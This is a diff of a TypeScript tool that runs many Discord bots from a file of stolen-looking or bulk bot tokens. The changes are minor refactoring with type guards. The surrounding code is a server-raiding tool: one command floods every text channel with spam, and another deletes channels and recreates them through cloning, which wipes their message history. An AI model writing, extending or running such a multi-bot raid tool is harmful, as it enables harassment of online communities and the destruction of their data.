@@ -29,6 +29,7 @@ import { log as Ox } from "console";
 import { readFile } from "fs/promises";
 import { writeFileSync } from "node:fs";
 import { generatePassword } from "../src/core/functions/random.js";
+import { isGuildTextChannel } from "../src/core/functions/typeGuards.js";
 
 // Définir le chemin des tokens
 const tokensPath = `${process.cwd()}/all_discord_bot_tokens.txt`;
@@ -41,8 +42,8 @@ const main_bot = "1266794768088956959";
 
 const clients: Client[] = [];
 
-// Fonction pour mettre à jour les flags d'un bot
-async function updateBotFlags(token: string) {
+// Fonction pour mettre à jour les flags d'un bot (appel commenté plus bas : exportée pour rester disponible)
+export async function updateBotFlags(token: string) {
 	try {
 		const response = await fetch(
 			"https://discord.com/api/v10/applications/@me",
@@ -124,10 +125,7 @@ for (const token of allTokens) {
 			message.react("✅").catch(() => {});
 			const count = parseInt(args[1]) || 1;
 			message.guild.channels.cache.forEach(async (channel) => {
-				if (
-					channel.isTextBased() &&
-					channel instanceof BaseGuildTextChannel
-				) {
+				if (channel.isTextBased() && isGuildTextChannel(channel)) {
 					for (let i = 0; i < count; i++) {
 						if (!isSpamming) break;
 						await (channel as BaseGuildTextChannel)
@@ -145,11 +143,12 @@ for (const token of allTokens) {
 				message.guild.channels.cache.forEach(async (channel) => {
 					if (
 						channel.isTextBased() &&
-						channel instanceof BaseGuildTextChannel &&
+						isGuildTextChannel(channel) &&
 						!ignore?.includes(channel.id)
 					) {
-						await channel.delete();
-						await channel.clone({
+						const text = channel as BaseGuildTextChannel;
+						await text.delete();
+						await text.clone({
 							name: channel.name,
 							parent: channel.parent,
 							permissionOverwrites:
